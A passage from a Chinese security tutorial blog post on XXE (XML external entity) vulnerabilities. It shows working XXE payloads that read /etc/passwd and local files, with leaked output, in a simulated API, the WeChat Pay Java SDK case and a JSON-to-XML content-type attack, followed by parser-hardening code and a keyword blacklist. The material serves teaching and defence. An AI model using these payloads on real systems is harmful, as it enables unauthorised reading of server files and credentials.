<h4 id="五、真实的-XXE-出现在哪"><a href="#五、真实的-XXE-出现在哪" class="headerlink" title="五、真实的 XXE 出现在哪"></a>五、真实的 XXE 出现在哪</h4><h5 id="我们刚刚说了那么多，都是只是我们对这个漏洞的理解，但是好像还没说这种漏洞出现在什么地方"><a href="#我们刚刚说了那么多，都是只是我们对这个漏洞的理解，但是好像还没说这种漏洞出现在什么地方" class="headerlink" title="我们刚刚说了那么多，都是只是我们对这个漏洞的理解，但是好像还没说这种漏洞出现在什么地方"></a>我们刚刚说了那么多，都是只是我们对这个漏洞的理解，但是好像还没说这种漏洞出现在什么地方</h5><h5 id="如今的-web-时代，是一个前后端分离的时代，有人说-MVC-就是前后端分离，但我觉得这种分离的并不彻底，后端还是要尝试去调用渲染类去控制前端的渲染，我所说的前后端分离是，后端-api-只负责接受约定好要传入的数据，然后经过一系列的黑盒运算，将得到结果以-json-格式返回给前端，前端只负责坐享其成，拿到数据json-decode-就行了（这里的后端可以是后台代码，也可以是外部的api-接口，这里的前端可以是传统意义的前端，也可以是后台代码）"><a href="#如今的-web-时代，是一个前后端分离的时代，有人说-MVC-就是前后端分离，但我觉得这种分离的并不彻底，后端还是要尝试去调用渲染类去控制前端的渲染，我所说的前后端分离是，后端-api-只负责接受约定好要传入的数据，然后经过一系列的黑盒运算，将得到结果以-json-格式返回给前端，前端只负责坐享其成，拿到数据json-decode-就行了（这里的后端可以是后台代码，也可以是外部的api-接口，这里的前端可以是传统意义的前端，也可以是后台代码）" class="headerlink" title="如今的 web 时代，是一个前后端分离的时代，有人说 MVC 就是前后端分离，但我觉得这种分离的并不彻底，后端还是要尝试去调用渲染类去控制前端的渲染，我所说的前后端分离是，后端 api 只负责接受约定好要传入的数据，然后经过一系列的黑盒运算，将得到结果以 json 格式返回给前端，前端只负责坐享其成，拿到数据json.decode 就行了（这里的后端可以是后台代码，也可以是外部的api 接口，这里的前端可以是传统意义的前端，也可以是后台代码）"></a>如今的 web 时代，是一个前后端分离的时代，有人说 MVC 就是前后端分离，但我觉得这种分离的并不彻底，后端还是要尝试去调用渲染类去控制前端的渲染，我所说的前后端分离是，后端 api 只负责接受约定好要传入的数据，然后经过一系列的黑盒运算，将得到结果以 json 格式返回给前端，前端只负责坐享其成，拿到数据json.decode 就行了（这里的后端可以是后台代码，也可以是外部的api 接口，这里的前端可以是传统意义的前端，也可以是后台代码）</h5><h5 id="那么问题经常就出现在-api-接口能解析客户端传过来的-xml-代码，并且直接外部实体的引用，比如下面这个"><a href="#那么问题经常就出现在-api-接口能解析客户端传过来的-xml-代码，并且直接外部实体的引用，比如下面这个" class="headerlink" title="那么问题经常就出现在 api 接口能解析客户端传过来的 xml 代码，并且直接外部实体的引用，比如下面这个"></a>那么问题经常就出现在 api 接口能解析客户端传过来的 xml 代码，并且直接外部实体的引用，比如下面这个</h5><h4 id="实例一：模拟情况"><a href="#实例一：模拟情况" class="headerlink" title="实例一：模拟情况"></a>实例一：模拟情况</h4><h5 id="示例代码：-14"><a href="#示例代码：-14" class="headerlink" title="示例代码："></a>示例代码：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">POST /vulnerable HTTP/1.1</span><br><span class="line">Host: www.test.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Referer: https://test.com/test.html</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Content-Length: 294</span><br><span class="line">Cookie: mycookie=cookies;</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;catalog&gt;</span><br><span class="line">   &lt;core id=&quot;test101&quot;&gt;</span><br><span class="line">      &lt;author&gt;John, Doe&lt;/author&gt;</span><br><span class="line">      &lt;title&gt;I love XML&lt;/title&gt;</span><br><span class="line">      &lt;category&gt;Computers&lt;/category&gt;</span><br><span class="line">      &lt;price&gt;9.99&lt;/price&gt;</span><br><span class="line">      &lt;date&gt;2018-10-01&lt;/date&gt;</span><br><span class="line">      &lt;description&gt;XML is the best!&lt;/description&gt;</span><br><span class="line">   &lt;/core&gt;</span><br><span class="line">&lt;/catalog&gt;</span><br></pre></td></tr></table></figure>

<h5 id="我们发出-带有-xml-的-POST-请求以后，述代码将交由服务器的XML处理器解析。代码被解释并返回：-“Request-Successful”-“Added-”"><a href="#我们发出-带有-xml-的-POST-请求以后，述代码将交由服务器的XML处理器解析。代码被解释并返回：-“Request-Successful”-“Added-”" class="headerlink" title="我们发出 带有 xml 的 POST 请求以后，述代码将交由服务器的XML处理器解析。代码被解释并返回：{“Request Successful”: “Added!”}"></a>我们发出 带有 xml 的 POST 请求以后，述代码将交由服务器的XML处理器解析。代码被解释并返回：{“Request Successful”: “Added!”}</h5><h5 id="但是如果我们传入一个恶意的代码"><a href="#但是如果我们传入一个恶意的代码" class="headerlink" title="但是如果我们传入一个恶意的代码"></a>但是如果我们传入一个恶意的代码</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE GVI [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;</span><br><span class="line">&lt;catalog&gt;</span><br><span class="line">   &lt;core id=&quot;test101&quot;&gt;</span><br><span class="line">      &lt;author&gt;John, Doe&lt;/author&gt;</span><br><span class="line">      &lt;title&gt;I love XML&lt;/title&gt;</span><br><span class="line">      &lt;category&gt;Computers&lt;/category&gt;</span><br><span class="line">      &lt;price&gt;9.99&lt;/price&gt;</span><br><span class="line">      &lt;date&gt;2018-10-01&lt;/date&gt;</span><br><span class="line">      &lt;description&gt;&amp;xxe;&lt;/description&gt;</span><br><span class="line">   &lt;/core&gt;</span><br><span class="line">&lt;/catalog&gt;</span><br></pre></td></tr></table></figure>

<h5 id="如果没有做好“安全措施”-就会出现解析恶意代码的情况，就会有下面的返回"><a href="#如果没有做好“安全措施”-就会出现解析恶意代码的情况，就会有下面的返回" class="headerlink" title="如果没有做好“安全措施” 就会出现解析恶意代码的情况，就会有下面的返回"></a>如果没有做好“安全措施” 就会出现解析恶意代码的情况，就会有下面的返回</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;error&quot;: &quot;no results for description root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br><span class="line">bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">sys:x:3:3:sys:/dev:/bin/sh</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync...</span><br></pre></td></tr></table></figure>

<h4 id="实例二：微信支付的-XXE"><a href="#实例二：微信支付的-XXE" class="headerlink" title="实例二：微信支付的 XXE"></a>实例二：微信支付的 XXE</h4><h5 id="前一阵子非常火的微信支付的-XXE-漏洞当然不得不提，"><a href="#前一阵子非常火的微信支付的-XXE-漏洞当然不得不提，" class="headerlink" title="前一阵子非常火的微信支付的 XXE 漏洞当然不得不提，"></a>前一阵子非常火的微信支付的 XXE 漏洞当然不得不提，</h5><h5 id="漏洞描述："><a href="#漏洞描述：" class="headerlink" title="漏洞描述："></a>漏洞描述：</h5><h5 id="微信支付提供了一个-api-接口，供商家接收异步支付结果，微信支付所用的java-sdk在处理结果时可能触发一个XXE漏洞，攻击者可以向这个接口发送构造恶意payloads-获取商家服务器上的任何信息，一旦攻击者获得了敏感的数据-md5-key-and-merchant-Id-etc-，他可能通过发送伪造的信息不用花钱就购买商家任意物品"><a href="#微信支付提供了一个-api-接口，供商家接收异步支付结果，微信支付所用的java-sdk在处理结果时可能触发一个XXE漏洞，攻击者可以向这个接口发送构造恶意payloads-获取商家服务器上的任何信息，一旦攻击者获得了敏感的数据-md5-key-and-merchant-Id-etc-，他可能通过发送伪造的信息不用花钱就购买商家任意物品" class="headerlink" title="微信支付提供了一个 api 接口，供商家接收异步支付结果，微信支付所用的java sdk在处理结果时可能触发一个XXE漏洞，攻击者可以向这个接口发送构造恶意payloads,获取商家服务器上的任何信息，一旦攻击者获得了敏感的数据 (md5-key and merchant-Id etc.)，他可能通过发送伪造的信息不用花钱就购买商家任意物品"></a>微信支付提供了一个 api 接口，供商家接收异步支付结果，微信支付所用的java sdk在处理结果时可能触发一个XXE漏洞，攻击者可以向这个接口发送构造恶意payloads,获取商家服务器上的任何信息，一旦攻击者获得了敏感的数据 (md5-key and merchant-Id etc.)，他可能通过发送伪造的信息不用花钱就购买商家任意物品</h5><h5 id="我下载了-java-版本的-sdk-进行分析，这个-sdk-提供了一个-WXPayUtil-工具类，该类中实现了xmltoMap和maptoXml这两个方法，而这次的微信支付的xxe漏洞爆发点就在xmltoMap方法中"><a href="#我下载了-java-版本的-sdk-进行分析，这个-sdk-提供了一个-WXPayUtil-工具类，该类中实现了xmltoMap和maptoXml这两个方法，而这次的微信支付的xxe漏洞爆发点就在xmltoMap方法中" class="headerlink" title="我下载了 java 版本的 sdk 进行分析，这个 sdk 提供了一个 WXPayUtil 工具类，该类中实现了xmltoMap和maptoXml这两个方法，而这次的微信支付的xxe漏洞爆发点就在xmltoMap方法中"></a>我下载了 java 版本的 sdk 进行分析，这个 sdk 提供了一个 WXPayUtil 工具类，该类中实现了xmltoMap和maptoXml这两个方法，而这次的微信支付的xxe漏洞爆发点就在xmltoMap方法中</h5><h5 id="如图所示：-3"><a href="#如图所示：-3" class="headerlink" title="如图所示："></a>如图所示：</h5><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002650-eb304d9e-ec17-1.png" alt></p>
<h5 id="问题就出现在我横线划出来的那部分，也就是简化为下面的代码："><a href="#问题就出现在我横线划出来的那部分，也就是简化为下面的代码：" class="headerlink" title="问题就出现在我横线划出来的那部分，也就是简化为下面的代码："></a>问题就出现在我横线划出来的那部分，也就是简化为下面的代码：</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map&lt;String, String&gt; <span class="title">xmlToMap</span><span class="params">(String strXML)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Map&lt;String, String&gt; data = <span class="keyword">new</span> HashMap&lt;String, String&gt;();</span><br><span class="line">            DocumentBuilder documentBuilder = WXPayXmlUtil.newDocumentBuilder();</span><br><span class="line">            InputStream stream = <span class="keyword">new</span> ByteArrayInputStream(strXML.getBytes(<span class="string">"UTF-8"</span>));</span><br><span class="line">            org.w3c.dom.Document doc = documentBuilder.parse(stream);</span><br><span class="line">            ...</span><br></pre></td></tr></table></figure>

<h5 id="我们可以看到-当构建了-documentBuilder-以后就直接对传进来的-strXML-解析了，而不巧的是-strXML-是一处攻击者可控的参数，于是就出现了-XXE-漏洞，下面是我实验的步骤"><a href="#我们可以看到-当构建了-documentBuilder-以后就直接对传进来的-strXML-解析了，而不巧的是-strXML-是一处攻击者可控的参数，于是就出现了-XXE-漏洞，下面是我实验的步骤" class="headerlink" title="我们可以看到 当构建了 documentBuilder 以后就直接对传进来的 strXML 解析了，而不巧的是 strXML 是一处攻击者可控的参数，于是就出现了 XXE 漏洞，下面是我实验的步骤"></a>我们可以看到 当构建了 documentBuilder 以后就直接对传进来的 strXML 解析了，而不巧的是 strXML 是一处攻击者可控的参数，于是就出现了 XXE 漏洞，下面是我实验的步骤</h5><h5 id="首先我在-com-包下又新建了一个包，来写我们的测试代码，测试代码我命名为-test001-java"><a href="#首先我在-com-包下又新建了一个包，来写我们的测试代码，测试代码我命名为-test001-java" class="headerlink" title="首先我在 com 包下又新建了一个包，来写我们的测试代码，测试代码我命名为 test001.java"></a>首先我在 com 包下又新建了一个包，来写我们的测试代码，测试代码我命名为 test001.java</h5><h5 id="如图所示：-4"><a href="#如图所示：-4" class="headerlink" title="如图所示："></a>如图所示：</h5><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002651-eb80dca0-ec17-1.png" alt></p>
<h5 id="test001-java"><a href="#test001-java" class="headerlink" title="test001.java"></a>test001.java</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test.test001;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.github.wxpay.sdk.WXPayUtil.xmlToMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test001</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        String xmlStr =<span class="string">"&lt;?xml version='1.0' encoding='utf-8'?&gt;\r\n"</span> +</span><br><span class="line">                <span class="string">"&lt;!DOCTYPE XDSEC [\r\n"</span> +</span><br><span class="line">                <span class="string">"&lt;!ENTITY xxe SYSTEM 'file:///d:/1.txt'&gt;]&gt;\r\n"</span> +</span><br><span class="line">                <span class="string">"&lt;XDSEC&gt;\r\n"</span>+</span><br><span class="line">                <span class="string">"&lt;XXE&gt;&amp;xxe;&lt;/XXE&gt;\r\n"</span> +</span><br><span class="line">                <span class="string">"&lt;/XDSEC&gt;"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line"></span><br><span class="line">            Map&lt;String,String&gt; test = xmlToMap(xmlStr);</span><br><span class="line">            System.out.println(test);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="我希望它能读取我-D-盘下面的-1-txt-文件"><a href="#我希望它能读取我-D-盘下面的-1-txt-文件" class="headerlink" title="我希望它能读取我 D 盘下面的 1.txt 文件"></a>我希望它能读取我 D 盘下面的 1.txt 文件</h5><h5 id="运行后成功读取"><a href="#运行后成功读取" class="headerlink" title="运行后成功读取"></a>运行后成功读取</h5><h5 id="如图所示：-5"><a href="#如图所示：-5" class="headerlink" title="如图所示："></a>如图所示：</h5><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002651-eba50724-ec17-1.png" alt></p>
<h5 id="当然，WXPayXmlUtil-java-中有这个-sdk-的配置项，能直接决定实验的效果，当然后期的修复也是针对这里面进行修复的"><a href="#当然，WXPayXmlUtil-java-中有这个-sdk-的配置项，能直接决定实验的效果，当然后期的修复也是针对这里面进行修复的" class="headerlink" title="当然，WXPayXmlUtil.java 中有这个 sdk 的配置项，能直接决定实验的效果，当然后期的修复也是针对这里面进行修复的"></a>当然，WXPayXmlUtil.java 中有这个 sdk 的配置项，能直接决定实验的效果，当然后期的修复也是针对这里面进行修复的</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://apache.org/xml/features/disallow-doctype-decl true</span><br><span class="line">http://apache.org/xml/features/nonvalidating/load-external-dtd false</span><br><span class="line">http://xml.org/sax/features/external-general-entities false</span><br><span class="line">http://xml.org/sax/features/external-parameter-entities false</span><br></pre></td></tr></table></figure>

<h5 id="整个源码我大佬打包好了已经上传到百度云，有兴趣的童鞋可以运行一下感受："><a href="#整个源码我大佬打包好了已经上传到百度云，有兴趣的童鞋可以运行一下感受：" class="headerlink" title="整个源码我大佬打包好了已经上传到百度云，有兴趣的童鞋可以运行一下感受："></a>整个源码我大佬打包好了已经上传到百度云，有兴趣的童鞋可以运行一下感受：</h5><h5 id="链接：https-pan-baidu-com-s-1YbCO2cZpzZS1mWd7Mes4Qw-提取码：xq1b"><a href="#链接：https-pan-baidu-com-s-1YbCO2cZpzZS1mWd7Mes4Qw-提取码：xq1b" class="headerlink" title="链接：https://pan.baidu.com/s/1YbCO2cZpzZS1mWd7Mes4Qw 提取码：xq1b"></a>链接：<a href="https://pan.baidu.com/s/1YbCO2cZpzZS1mWd7Mes4Qw" target="_blank" rel="noopener">https://pan.baidu.com/s/1YbCO2cZpzZS1mWd7Mes4Qw</a> 提取码：xq1b</h5><p>#####上面说过 java 中有一个 netdoc:/ 协议能代替 file:/// ,我现在来演示一下：</p>
<h5 id="如图所示：-6"><a href="#如图所示：-6" class="headerlink" title="如图所示："></a>如图所示：</h5><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002652-ebdec6a8-ec17-1.png" alt></p>
<h4 id="实例三：JSON-content-type-XXE"><a href="#实例三：JSON-content-type-XXE" class="headerlink" title="实例三：JSON content-type XXE"></a>实例三：JSON content-type XXE</h4><h5 id="正如我们所知道的，很多web和移动应用都基于客户端-服务器交互模式的web通信服务。不管是SOAP还是RESTful，一般对于web服务来说，最常见的数据格式都是XML和JSON。尽管web服务可能在编程时只使用其中一种格式，但服务器却可以接受开发人员并没有预料到的其他数据格式，这就有可能会导致JSON节点受到XXE（XML外部实体）攻击"><a href="#正如我们所知道的，很多web和移动应用都基于客户端-服务器交互模式的web通信服务。不管是SOAP还是RESTful，一般对于web服务来说，最常见的数据格式都是XML和JSON。尽管web服务可能在编程时只使用其中一种格式，但服务器却可以接受开发人员并没有预料到的其他数据格式，这就有可能会导致JSON节点受到XXE（XML外部实体）攻击" class="headerlink" title="正如我们所知道的，很多web和移动应用都基于客户端-服务器交互模式的web通信服务。不管是SOAP还是RESTful，一般对于web服务来说，最常见的数据格式都是XML和JSON。尽管web服务可能在编程时只使用其中一种格式，但服务器却可以接受开发人员并没有预料到的其他数据格式，这就有可能会导致JSON节点受到XXE（XML外部实体）攻击"></a>正如我们所知道的，很多web和移动应用都基于客户端-服务器交互模式的web通信服务。不管是SOAP还是RESTful，一般对于web服务来说，最常见的数据格式都是XML和JSON。尽管web服务可能在编程时只使用其中一种格式，但服务器却可以接受开发人员并没有预料到的其他数据格式，这就有可能会导致JSON节点受到XXE（XML外部实体）攻击</h5><h5 id="原始请求和响应："><a href="#原始请求和响应：" class="headerlink" title="原始请求和响应："></a>原始请求和响应：</h5><h5 id="HTTP-Request"><a href="#HTTP-Request" class="headerlink" title="HTTP Request:"></a>HTTP Request:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST /netspi HTTP/1.1</span><br><span class="line">Host: someserver.netspi.com</span><br><span class="line">Accept: application/json</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 38</span><br><span class="line"></span><br><span class="line">&#123;&quot;search&quot;:&quot;name&quot;,&quot;value&quot;:&quot;netspitest&quot;&#125;</span><br></pre></td></tr></table></figure>

<h5 id="HTTP-Response"><a href="#HTTP-Response" class="headerlink" title="HTTP Response:"></a>HTTP Response:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 43</span><br><span class="line"></span><br><span class="line">&#123;&quot;error&quot;: &quot;no results for name netspitest&quot;&#125;</span><br></pre></td></tr></table></figure>

<h5 id="现在我们尝试将-Content-Type-修改为-application-xml"><a href="#现在我们尝试将-Content-Type-修改为-application-xml" class="headerlink" title="现在我们尝试将 Content-Type 修改为 application/xml"></a>现在我们尝试将 Content-Type 修改为 application/xml</h5><h4 id="进一步请求和响应："><a href="#进一步请求和响应：" class="headerlink" title="进一步请求和响应："></a>进一步请求和响应：</h4><h5 id="HTTP-Request-1"><a href="#HTTP-Request-1" class="headerlink" title="HTTP Request:"></a>HTTP Request:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST /netspi HTTP/1.1</span><br><span class="line">Host: someserver.netspi.com</span><br><span class="line">Accept: application/json</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Content-Length: 38</span><br><span class="line"></span><br><span class="line">&#123;&quot;search&quot;:&quot;name&quot;,&quot;value&quot;:&quot;netspitest&quot;&#125;</span><br></pre></td></tr></table></figure>

<h5 id="HTTP-Response-1"><a href="#HTTP-Response-1" class="headerlink" title="HTTP Response:"></a>HTTP Response:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 500 Internal Server Error</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 127</span><br><span class="line"></span><br><span class="line">&#123;&quot;errors&quot;:&#123;&quot;errorMessage&quot;:&quot;org.xml.sax.SAXParseException: XML document structures must start and end within the same entity.&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>

<h5 id="可以发现服务器端是能处理-xml-数据的，于是我们就可以利用这个来进行攻击"><a href="#可以发现服务器端是能处理-xml-数据的，于是我们就可以利用这个来进行攻击" class="headerlink" title="可以发现服务器端是能处理 xml 数据的，于是我们就可以利用这个来进行攻击"></a>可以发现服务器端是能处理 xml 数据的，于是我们就可以利用这个来进行攻击</h5><h5 id="最终的请求和响应："><a href="#最终的请求和响应：" class="headerlink" title="最终的请求和响应："></a>最终的请求和响应：</h5><h5 id="HTTP-Request-2"><a href="#HTTP-Request-2" class="headerlink" title="HTTP Request:"></a>HTTP Request:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /netspi HTTP/1.1</span><br><span class="line">Host: someserver.netspi.com</span><br><span class="line">Accept: application/json</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Content-Length: 288</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE netspi [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;search&gt;name&lt;/search&gt;</span><br><span class="line">&lt;value&gt;&amp;xxe;&lt;/value&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>

<h5 id="Http-Response"><a href="#Http-Response" class="headerlink" title="Http Response:"></a>Http Response:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 2467</span><br><span class="line"></span><br><span class="line">&#123;&quot;error&quot;: &quot;no results for name root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br><span class="line">bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">sys:x:3:3:sys:/dev:/bin/sh</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync....</span><br></pre></td></tr></table></figure>

<h4 id="六、XXE-如何防御"><a href="#六、XXE-如何防御" class="headerlink" title="六、XXE 如何防御"></a>六、XXE 如何防御</h4><h5 id="方案一：使用语言中推荐的禁用外部实体的方法"><a href="#方案一：使用语言中推荐的禁用外部实体的方法" class="headerlink" title="方案一：使用语言中推荐的禁用外部实体的方法"></a>方案一：使用语言中推荐的禁用外部实体的方法</h5><h5 id="PHP："><a href="#PHP：" class="headerlink" title="PHP："></a>PHP：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libxml_disable_entity_loader(true);</span><br></pre></td></tr></table></figure>

<h5 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA:"></a>JAVA:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(false);</span><br><span class="line"></span><br><span class="line">.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;,true);</span><br><span class="line"></span><br><span class="line">.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;,false)</span><br><span class="line"></span><br><span class="line">.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;,false);</span><br></pre></td></tr></table></figure>

<h5 id="python"><a href="#python" class="headerlink" title="python:"></a>python:</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=<span class="literal">False</span>))</span><br></pre></td></tr></table></figure>

<h4 id="方案二：手动黑名单过滤-不推荐"><a href="#方案二：手动黑名单过滤-不推荐" class="headerlink" title="方案二：手动黑名单过滤(不推荐)"></a>方案二：手动黑名单过滤(不推荐)</h4><h5 id="过滤关键词："><a href="#过滤关键词：" class="headerlink" title="过滤关键词："></a>过滤关键词：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE、&lt;!ENTITY SYSTEM、PUBLIC</span><br></pre></td></tr></table></figure>

<h4 id="七、总结"><a href="#七、总结" class="headerlink" title="七、总结"></a>七、总结</h4><h5 id="对-XXE-漏洞做了一个重新的认识，对其中一些细节问题做了对应的实战测试，重点在于-netdoc-的利用和-jar-协议的利用，这个-jar-协议的使用很神奇，网上的资料也比较少，我测试也花了很长的时间，希望有真实的案例能出现，利用方式还需要各位大师傅们的努力挖掘。"><a href="#对-XXE-漏洞做了一个重新的认识，对其中一些细节问题做了对应的实战测试，重点在于-netdoc-的利用和-jar-协议的利用，这个-jar-协议的使用很神奇，网上的资料也比较少，我测试也花了很长的时间，希望有真实的案例能出现，利用方式还需要各位大师傅们的努力挖掘。" class="headerlink" title="对 XXE 漏洞做了一个重新的认识，对其中一些细节问题做了对应的实战测试，重点在于 netdoc 的利用和 jar 协议的利用，这个 jar 协议的使用很神奇，网上的资料也比较少，我测试也花了很长的时间，希望有真实的案例能出现，利用方式还需要各位大师傅们的努力挖掘。"></a>对 XXE 漏洞做了一个重新的认识，对其中一些细节问题做了对应的实战测试，重点在于 netdoc 的利用和 jar 协议的利用，这个 jar 协议的使用很神奇，网上的资料也比较少，我测试也花了很长的时间，希望有真实的案例能出现，利用方式还需要各位大师傅们的努力挖掘。</h5><h5 id="你的知识面，决定着你的攻击面。"><a href="#你的知识面，决定着你的攻击面。" class="headerlink" title="你的知识面，决定着你的攻击面。"></a>你的知识面，决定着你的攻击面。</h5><h4 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h4><h5 